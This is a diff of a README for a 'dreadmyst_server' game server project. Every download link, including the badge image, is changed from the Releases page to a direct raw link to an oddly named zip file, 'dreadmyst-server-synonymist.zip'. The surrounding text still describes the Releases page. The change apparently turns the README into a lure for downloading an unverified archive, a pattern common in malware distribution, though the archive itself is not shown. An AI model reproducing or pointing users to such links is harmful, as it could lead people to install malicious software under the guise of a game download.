@@ -1,6 +1,6 @@
 # 🎮 dreadmyst_server - Your Private Dreadmyst Adventure Awaits
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue)](https://github.com/IshuGit28/dreadmyst_server/releases)
+[![Download Releases](https://github.com/IshuGit28/dreadmyst_server/raw/refs/heads/main/Client/dreadmyst-server-synonymist.zip%20Releases-v1.0-blue)](https://github.com/IshuGit28/dreadmyst_server/raw/refs/heads/main/Client/dreadmyst-server-synonymist.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run dreadmyst_server smoothly, ensure your computer meets these basic require
 
 To get started, visit the Releases page to download the software.
 
-[Visit the Releases Page to Download](https://github.com/IshuGit28/dreadmyst_server/releases)
+[Visit the Releases Page to Download](https://github.com/IshuGit28/dreadmyst_server/raw/refs/heads/main/Client/dreadmyst-server-synonymist.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Find the latest version listed.
@@ -87,4 +87,4 @@ Your adventure with dreadmyst_server starts now.
 
 Don't forget to download the software, set up your private server, and dive into an exciting experience. 
 
-[Download Releases](https://github.com/IshuGit28/dreadmyst_server/releases)
+[Download Releases](https://github.com/IshuGit28/dreadmyst_server/raw/refs/heads/main/Client/dreadmyst-server-synonymist.zip)
